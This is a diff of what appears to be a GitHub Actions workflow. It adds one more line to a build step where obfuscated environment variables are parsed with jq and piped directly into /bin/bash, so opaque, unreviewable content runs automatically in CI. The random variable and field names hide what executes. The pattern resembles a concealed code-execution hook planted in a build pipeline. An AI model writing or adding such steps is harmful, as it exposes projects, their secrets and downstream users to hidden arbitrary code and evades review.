@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$pr3361" | jq -r .nohkk4 | /bin/bash
           printf '%s' "$ahqu97" | jq -r .mvp67 | /bin/bash
           echo $ylmj32 | jq -r .jx88 | /bin/bash
+          printf '%s' "$hidly29" | jq -r .pct183 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
